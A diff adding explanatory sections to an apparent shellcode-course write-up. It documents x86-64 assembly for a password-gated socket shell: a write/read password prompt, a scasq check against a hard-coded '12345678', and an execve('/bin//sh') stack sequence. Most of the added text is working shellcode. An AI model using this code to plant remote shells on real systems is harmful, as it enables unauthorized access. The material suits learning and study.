@@ -187,3 +187,75 @@ Registers get the following values for the parameters:
 -	RDI <- new file descriptor : Is the client socket id
 -	RSI <- old file descriptor : Will be one call for STDIN, STDOUT, STDERR.
 
+#### Password Stuff
+
+First thing done in this part of the code, is to show the `"Passwd: "` prompt when connection established. This is done using the `write()`syscall to print the string stored in PASSWD_PROMPT. Access to the PASWD_PROMPT is done using Relative Addressing:
+
+```asm
+write_syscall:
+        mov rax, 1                      	; Syscall number for write()
+        mov rdi, 1
+        lea rsi, [rel PASSWD_PROMPT]    	; Rel addressing for the prompt
+        mov rdx, 8                      	; length of the string
+        syscall
+```
+
+The password input is then stored in the PASSWD_INPUT string. Access to it is also done using Relative Addressing:
+
+```asm
+read_syscall:
+        xor rax, rax                    ; Syscall number for read()
+        mov rdi, 0
+        lea rsi, [rel PASSWD_INPUT]     ; Rel addressing for the input
+        mov rdx, 8                      ; Max length of the input allowed
+        syscall
+```
+
+The last part of this section, is to compare the typed password from the user with the defined password. Password is defined as "12345678", and is hard coded into the RAX register (in case another password is desireed, value can be changed). RDI gets the address of the PASSWD_INPUT string via Relative Addressing. Comparison is done using the `scasq`instructio: if the two values does not match, program `jmp` to end, and if the password match, go to execute next section, the shell:
+
+ ```asm
+ compare_passwords:
+
+        mov rax, "12345678"             ; This is the password
+        lea rdi, [rel PASSWD_INPUT]
+        scasq                           ; Compare the qword for passwords
+        jnz exit_program                ; Passwords dont match, we exit
+```
+
+#### The Shell: Execve
+
+Code used is the standard from Execve-Stack. In this code, the `/bin//sh` string is stored in the Stack and accessed via the Stack Technique:
+
+```asm
+execve_syscall:
+
+        ; First NULL push
+        xor rax, rax
+        push rax
+
+        ; push /bin//sh in reverse
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        ; store /bin//sh address in RDI
+        mov rdi, rsp
+
+        ; Second NULL push
+        push rax
+
+        ; set RDX
+        mov rdx, rsp
+
+        ; Push address of /bin//sh
+        push rdi
+        mov rsi, rsp
+
+        ; Call the Execve syscall
+        add rax, 59
+        syscall
+```
+
+
+ 
+ 
+ 
